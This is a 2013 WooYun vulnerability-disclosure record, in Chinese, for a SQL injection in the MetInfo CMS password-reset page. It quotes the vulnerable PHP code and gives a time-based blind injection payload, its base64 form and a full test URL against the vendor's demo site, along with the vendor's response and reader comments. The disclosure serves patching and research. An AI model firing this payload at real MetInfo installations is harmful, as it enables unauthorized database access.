{"id": 11819, "wybug_id": "wooyun-2013-021062", "wybug_title": "metinfo企业网站管理系统SQL注入漏洞", "wybug_corp": "长沙米拓信息技术有限公司", "wybug_author": "applychen", "wybug_date": "2013-04-01 15:01", "wybug_open_date": "2013-06-30 15:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-05-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-30：\t细节向公众公开  简要描述： metinfo企业网站管理系统SQL注入漏洞 详细说明：  member/getpassword.php与admin/admin/getpassword.php文件中\nif($p){   $array = explode('.',base64_decode($p));   $sql=\"SELECT * FROM $met_admin_table WHERE admin_id='\".$array[0].\"'\";   $sqlarray = $db->get_one($sql);\nbase64_decode($p)后的值用explode分割然后提交给 $array数组，最终$array[0]进入SQL查询，注入发生。   漏洞证明：  1'or(select sleep(5))#.1将之base64编码MSdvcihzZWxlY3Qgc2xlZXAoMTApKSMuMQ==然后http://demo.metinfo.cn/member/getpassword.php?lang=cn&p=MSdvcihzZWxlY3Qgc2xlZXAoNSkpIy4x   修复方案：  过滤$array[0]   版权声明：转载请注明来源 applychen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2013-04-04 22:08 厂商回复： CNVD确认并在多个实例上复现所述情况（主要涉及中小企业网站），已在3日下午联系上软件生产厂商，待其后续进一步反馈。按部分影响机密性、可用性、完整性进行评分，rank=7.48*1.2*1.3=11.668 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-01 15:15 |    \t\t小鸡鸡 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:4        )\t\t \n  5.0以上版本的吗    \n     2013-04-01 17:29 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  message/access.php?about/show.php?member/feedback.php?job/save.php?member/cv_editor.php?member/fdeditor.php?LZ在列表里不    \n     2013-04-01 22:14 |    \t\tapplychen \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:16        | 白发现首)\t\t \n  @小鸡鸡 测试官方站点成功@Passer_by 木有在你的列表里面……    \n     2013-04-01 22:49 |    \t\t小鸡鸡 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:4        )\t\t \n  @applychen 求exp 求exp1321212165@qq.com    \n     2014-02-03 12:19 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  按部分影响机密性、可用性、完整性进行评分，rank=7.48*1.2*1.3=11.668还要算的...    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}